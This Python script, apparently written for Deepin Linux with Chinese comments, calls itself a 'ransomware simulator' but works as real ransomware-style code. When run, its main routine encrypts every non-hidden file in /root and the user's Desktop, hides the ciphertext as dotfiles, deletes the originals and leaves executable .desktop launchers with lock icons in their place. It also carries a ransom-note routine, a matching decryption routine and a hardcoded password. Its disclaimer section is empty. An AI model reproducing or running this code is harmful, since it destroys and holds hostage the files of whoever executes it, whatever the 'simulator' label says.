#!/usr/bin/env python3
"""
"""

import os
import sys
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import subprocess
import shutil
import base64
import pickle
import json
import time
import mimetypes
import stat

class DeepinRansomwareSimulator:
    def __init__(self, custom_lock_icon=None):
        # 目标目录
        # 获取当前工作目录的绝对路径
        current_dir = Path.cwd()
        # 获取当前用户主目录
        user_dir = f"/home/{os.getlogin()}/Desktop"

        # 相对路径
        relative_path = "./lock.jpg"
        
        # 转换为绝对路径
        abs_path = (current_dir / relative_path).resolve()
        print(f"user_dir: {user_dir}")
        self.target_dirs = [
            "/root",
            user_dir
        ]

        # 加密文件扩展名
        self.encrypted_extension = ".encrypted_deepin"
        
        # 使用指定的图片路径
        self.lock_icon_path = custom_lock_icon if custom_lock_icon else str(abs_path)
        
        # 配置文件路径
        self.icon_config_file = "/tmp/deepin_icon_config.pkl"
        
        # 存储文件原始信息
        self.original_info = {}
        
        # 验证图片文件
        self.validate_image_files()
        
    def validate_image_files(self):
        """验证指定的图片文件是否存在"""
        # 检查锁图标
        if self.lock_icon_path and not Path(self.lock_icon_path).exists():
            print(f"警告: 锁图标文件不存在: {self.lock_icon_path}")
            self.create_custom_lock_icon()
    
    def create_custom_lock_icon(self):
        """创建自定义锁图标"""
        try:
            print("\n创建自定义锁图标...")
            # 创建锁图标
            lock_svg = '''<svg width="48" height="48" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
  <rect width="48" height="48" fill="#FF0000" rx="8"/>
  <rect x="14" y="18" width="20" height="14" fill="#FFFFFF" rx="3"/>
  <rect x="18" y="10" width="12" height="8" fill="#FFFFFF" rx="2"/>
  <text x="24" y="29" text-anchor="middle" fill="#000000" font-family="Arial, sans-serif" font-size="14" font-weight="bold">L</text>
</svg>'''
            
            # 保存为SVG文件
            svg_path = "/tmp/custom_lock.svg"
            with open(svg_path, 'w') as f:
                f.write(lock_svg)
            
            # 转换为JPG
            subprocess.run([
                'convert', svg_path, '-resize', '48x48', self.lock_icon_path
            ], capture_output=True)
            
            print(f"✓ 已创建自定义锁图标: {self.lock_icon_path}")
            
        except Exception as e:
            print(f"✗ 创建自定义图标时出错: {e}")
    
    def generate_key(self, password: str) -> bytes:
        """从密码生成加密密钥"""
        salt = b'deepin_edu_salt_'
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
    
    def encrypt_file(self, file_path: Path, key: bytes) -> bool:
        """加密单个文件并隐藏加密文件，创建桌面入口"""
        try:
            # 跳过特殊文件和已加密文件
            if file_path.name.startswith('.') or file_path.name.endswith('.desktop'):
                return False
                
            if file_path.name in ["README_DECRYPT_DEEPIN.txt", "DEEPIN_SECURITY_WARNING.txt"]:
                return False
            
            print(f"正在处理: {file_path.name}")
            
            # 保存原始文件信息
            self.save_original_file_info(file_path)
            
            # 读取并加密文件内容
            with open(file_path, 'rb') as f:
                data = f.read()
            
            fernet = Fernet(key)
            encrypted_data = fernet.encrypt(data)
            
            # 创建隐藏的加密文件名（以点开头）
            encrypted_filename = '.' + file_path.name + self.encrypted_extension
            
            # 写入隐藏的加密文件
            encrypted_path = file_path.parent / encrypted_filename
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            # 创建同名的桌面入口文件（可见）
            desktop_file = self.create_desktop_entry(file_path, encrypted_path)
            
            # 删除原始文件
            file_path.unlink()
            
            print(f"✓ 已创建桌面入口: {file_path.name}.desktop")
            return True
            
        except Exception as e:
            print(f"✗ 处理文件时出错 {file_path}: {e}")
            return False
    
    def save_original_file_info(self, file_path: Path):
        """保存文件的原始信息"""
        try:
            self.original_info[str(file_path)] = {
                'path': str(file_path),
                'extension': file_path.suffix,
                'name': file_path.name,
                'hidden_name': '.' + file_path.name + self.encrypted_extension
            }
        except Exception as e:
            print(f"保存文件信息时出错: {e}")
    
    def create_desktop_entry(self, original_path: Path, encrypted_path: Path) -> Path:
        """为加密文件创建桌面入口"""
        try:
            # 桌面入口文件名
            desktop_filename = original_path.name + '.desktop'
            desktop_path = original_path.parent / desktop_filename
            
            # 创建桌面入口文件内容
            desktop_content = f"""[Desktop Entry]
Type=Application
Name={original_path.name} (已加密)
Comment=Deepin 加密文件
Icon={self.lock_icon_path}
Exec=echo "这是一个加密文件，请运行解密程序进行恢复。"文件已被加密，请查看 README_DECRYPT_DEEPIN.txt 获取恢复说明。
Terminal=false
Categories=Utility;
MimeType=application/x-deepin-encrypted;
Hidden=false
NoDisplay=false
"""
            
            # 写入桌面入口文件
            with open(desktop_path, 'w') as f:
                f.write(desktop_content)
            
            # 设置可执行权限
            os.chmod(desktop_path, os.stat(desktop_path).st_mode | stat.S_IEXEC)
            
            # 设置桌面入口文件的图标
            self.set_desktop_file_icon(desktop_path)
            
            return desktop_path
            
        except Exception as e:
            print(f"✗ 创建桌面入口时出错: {e}")
            raise
    
    def set_desktop_file_icon(self, desktop_path: Path):
        """为桌面入口文件设置图标"""
        try:
            # 方法1: 使用gio设置图标
            subprocess.run([
                'gio', 'set', str(desktop_path),
                'metadata::custom-icon', f'file://{self.lock_icon_path}'
            ], capture_output=True, text=True)
            
            # 方法2: 设置MIME类型关联
            self.associate_mime_type_deepin()
            
        except Exception as e:
            print(f"✗ 设置桌面入口图标时出错: {e}")
    
    def associate_mime_type_deepin(self):
        """关联 MIME 类型到图标"""
        try:
            # 使用绝对路径
            icon_path = os.path.abspath(self.lock_icon_path)
            
            # 创建 MIME 类型 XML
            mime_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<mime-info xmlns="http://www.freedesktop.org/standards/shared-mime-info">
  <mime-type type="application/x-deepin-encrypted">
    <comment>Deepin Encrypted File</comment>
    <glob pattern="*.encrypted_deepin.desktop"/>
    <icon name="{icon_path}"/>
  </mime-type>
</mime-info>"""
            
            # 保存到用户目录
            mime_dir = Path.home() / ".local" / "share" / "mime" / "packages"
            mime_dir.mkdir(parents=True, exist_ok=True)
            mime_file = mime_dir / "deepin-encrypted.xml"
            
            with open(mime_file, 'w') as f:
                f.write(mime_xml)
            
            # 更新 MIME 数据库
            subprocess.run([
                'update-mime-database',
                str(Path.home() / ".local" / "share" / "mime")
            ], capture_output=True)
            
        except Exception as e:
            print(f"✗ 关联 MIME 类型时出错: {e}")
    
    def refresh_icon_cache(self):
        """刷新图标缓存"""
        try:
            # 刷新图标缓存
            subprocess.run([
                'gtk-update-icon-cache', '-f', '-t',
                str(Path.home() / ".local" / "share" / "icons")
            ], capture_output=True)
            
            # 重启文件管理器以应用更改
            subprocess.run(['killall', 'dde-file-manager'], capture_output=True)
            time.sleep(1)
            subprocess.run(['dde-file-manager', '--daemon-mode'], capture_output=True)
            
        except Exception as e:
            print(f"✗ 刷新图标缓存时出错: {e}")
    
    def save_icon_config(self):
        """保存图标配置信息"""
        try:
            config = {
                'original_info': self.original_info,
                'lock_icon_path': self.lock_icon_path
            }
            
            with open(self.icon_config_file, 'wb') as f:
                pickle.dump(config, f)
            print("✓ 图标配置已保存")
        except Exception as e:
            print(f"✗ 保存配置时出错: {e}")
    
    def load_icon_config(self):
        """加载图标配置信息"""
        try:
            if Path(self.icon_config_file).exists():
                with open(self.icon_config_file, 'rb') as f:
                    config = pickle.load(f)
                
                self.original_info = config.get('original_info', {})
                self.lock_icon_path = config.get('lock_icon_path', self.lock_icon_path)
                
                print("✓ 图标配置已加载")
                return True
        except Exception as e:
            print(f"✗ 加载配置时出错: {e}")
        return False
    
    def decrypt_file(self, desktop_path: Path, key: bytes) -> bool:
        """通过桌面入口文件解密对应的隐藏文件"""
        try:
            if not desktop_path.name.endswith('.desktop'):
                return False
            
            # 从桌面入口文件名获取原始文件名
            original_name = desktop_path.name[:-8]  # 去掉 .desktop 后缀
            
            # 查找对应的隐藏加密文件
            encrypted_filename = '.' + original_name + self.encrypted_extension
            encrypted_path = desktop_path.parent / encrypted_filename
            
            if not encrypted_path.exists():
                print(f"✗ 找不到对应的加密文件: {encrypted_filename}")
                return False
            
            print(f"正在解密: {original_name}")
            
            # 读取并解密隐藏的加密文件
            with open(encrypted_path, 'rb') as f:
                encrypted_data = f.read()
            
            fernet = Fernet(key)
            decrypted_data = fernet.decrypt(encrypted_data)
            
            # 恢复原始文件
            original_path = desktop_path.parent / original_name
            with open(original_path, 'wb') as f:
                f.write(decrypted_data)
            
            # 删除隐藏加密文件
            encrypted_path.unlink()
            
            # 删除桌面入口文件
            desktop_path.unlink()
            
            print(f"✓ 已解密: {original_name}")
            return True
            
        except Exception as e:
            print(f"✗ 解密文件时出错 {desktop_path}: {e}")
            return False
    
    def create_ransom_note(self):
        """创建勒索说明文件"""
        ransom_note = f"""⚠️  文件已被加密 ⚠️

您的文件已被加密。

加密文件状态：
- 加密文件：以点开头隐藏（如 .filename.txt.encrypted_deepin）
- 桌面入口：可见文件（如 filename.txt.desktop）

"""
        
        for dir_path in self.target_dirs:
            dir_path_obj = Path(dir_path)
            if dir_path_obj.exists():
                note_path = dir_path_obj / "README_DECRYPT_DEEPIN.txt"
                with open(note_path, 'w', encoding='utf-8') as f:
                    f.write(ransom_note)
                print(f"✓ 创建说明文件: {note_path}")
    
    def simulate_encryption(self):
        """模拟加密过程"""
        print("\n" + "=" * 60)
        print("开始文件加密...")
        print(f"使用的锁图标: {self.lock_icon_path}")
        print("=" * 60)
        
        # 验证目标目录
        valid_dirs = []
        for dir_path in self.target_dirs:
            dir_path_obj = Path(dir_path)
            if dir_path_obj.exists():
                valid_dirs.append(dir_path_obj)
                print(f"目标目录: {dir_path}")
            else:
                print(f"警告: 目录不存在: {dir_path}")
        
        if not valid_dirs:
            print("错误: 没有有效的目标目录")
            return
        
        # 生成加密密钥
        key = self.generate_key("123")
        
        # 加密文件并创建桌面入口
        processed_count = 0
        total_files = 0
        
        for dir_path_obj in valid_dirs:
            for item in dir_path_obj.iterdir():
                if item.is_file() and not item.name.startswith('.'):
                    # 跳过特殊文件
                    if item.name in ["README_DECRYPT_DEEPIN.txt", "DEEPIN_SECURITY_WARNING.txt"]:
                        continue
                    
                    total_files += 1
                    if self.encrypt_file(item, key):
                        processed_count += 1
        
        if processed_count > 0:
            # 保存图标配置
            self.save_icon_config()
            
            # 创建勒索说明
            # self.create_ransom_note()
            
            # 刷新图标缓存
            # self.refresh_icon_cache()
            
            print("\n" + "=" * 60)
            print(f"处理完成: {processed_count}/{total_files} 个文件")
            print("加密文件已隐藏（以点开头）")
            print("桌面入口文件已创建（带锁图标）")
            print("=" * 60)
        else:
            print("没有找到可以处理的文件")
    
    def simulate_decryption(self):
        """模拟解密过程"""
        print("\n" + "=" * 60)
        print("开始模拟解密...")
        print("=" * 60)
        
        # 获取密码
        password = "123"
        key = self.generate_key(password)
        
        # 解密文件
        decrypted_count = 0
        total_desktop_files = 0
        
        for dir_path in self.target_dirs:
            dir_path_obj = Path(dir_path)
            if dir_path_obj.exists():
                for item in dir_path_obj.iterdir():
                    if item.is_file() and item.name.endswith('.desktop'):
                        total_desktop_files += 1
                        if self.decrypt_file(item, key):
                            decrypted_count += 1
        
        if decrypted_count > 0:
            # 清理配置文件
            self.cleanup_config_files()
            
            # 删除说明文件
            for dir_path in self.target_dirs:
                note_file = Path(dir_path) / "README_DECRYPT_DEEPIN.txt"
                if note_file.exists():
                    note_file.unlink()
            
            # 删除桌面警告
            warning_file = Path.home() / "Desktop" / "DEEPIN_SECURITY_WARNING.txt"
            if warning_file.exists():
                warning_file.unlink()
            
            # 刷新图标缓存
            self.refresh_icon_cache()
            
            print("\n" + "=" * 60)
            print(f"解密完成: {decrypted_count}/{total_desktop_files} 个文件")
            print("文件已恢复")
            print("=" * 60)
        else:
            print("没有找到可以解密的桌面入口文件")
    
    def cleanup_config_files(self):
        """清理配置文件"""
        try:
            # 清理 MIME 类型配置
            mime_file = Path.home() / ".local" / "share" / "mime" / "packages" / "deepin-encrypted.xml"
            if mime_file.exists():
                mime_file.unlink()
            
            # 更新 MIME 数据库
            mime_dir = Path.home() / ".local" / "share" / "mime"
            if mime_dir.exists():
                subprocess.run(['update-mime-database', str(mime_dir)], capture_output=True)
            
        except Exception as e:
            print(f"清理配置文件时出错: {e}")
    
    def cleanup(self):
        """清理所有配置文件"""
        print("\n" + "=" * 60)
        print("清理配置文件...")
        print("=" * 60)
        
        try:
            # 删除图标配置
            if Path(self.icon_config_file).exists():
                Path(self.icon_config_file).unlink()
                print(f"✓ 已删除配置文件: {self.icon_config_file}")
            
            # 清理配置文件
            self.cleanup_config_files()
            
            # 刷新图标缓存
            self.refresh_icon_cache()
            
            print("\n✓ 清理完成")
            print("=" * 60)
            
        except Exception as e:
            print(f"\n✗ 清理时出错: {e}")
    
    def list_encrypted_files(self):
        """列出所有加密文件"""
        print("\n" + "=" * 60)
        print("加密文件状态:")
        print("=" * 60)
        
        total_hidden = 0
        total_desktop = 0
        
        for dir_path in self.target_dirs:
            dir_path_obj = Path(dir_path)
            if dir_path_obj.exists():
                print(f"\n目录: {dir_path}")
                
                # 列出隐藏的加密文件
                hidden_files = []
                for item in dir_path_obj.iterdir():
                    if item.is_file() and item.name.startswith('.') and item.name.endswith(self.encrypted_extension):
                        hidden_files.append(item.name)
                        total_hidden += 1
                
                if hidden_files:
                    print(f"  隐藏加密文件 ({len(hidden_files)}):")
                    for hf in hidden_files:
                        print(f"    {hf}")
                
                # 列出桌面入口文件
                desktop_files = []
                for item in dir_path_obj.iterdir():
                    if item.is_file() and item.name.endswith('.desktop') and not item.name.startswith('.'):
                        desktop_files.append(item.name)
                        total_desktop += 1
                
                if desktop_files:
                    print(f"  桌面入口文件 ({len(desktop_files)}):")
                    for df in desktop_files:
                        print(f"    {df}")
        
        print("\n" + "=" * 60)
        print(f"总计: {total_hidden} 个隐藏加密文件, {total_desktop} 个桌面入口文件")
        print("=" * 60)

def main():
    """主程序"""
    # 显示免责声明
    
    # 检查是否通过命令行参数指定了图标
    custom_icon = None
    
    if len(sys.argv) > 1:
        for i, arg in enumerate(sys.argv):
            if arg == "--icon" and i + 1 < len(sys.argv):
                custom_icon = sys.argv[i + 1]
    
    # 创建模拟器实例
    simulator = DeepinRansomwareSimulator(
        custom_lock_icon=custom_icon
    )
    
    simulator.simulate_encryption()
        

if __name__ == "__main__":
    # 使用说明
    
    main()

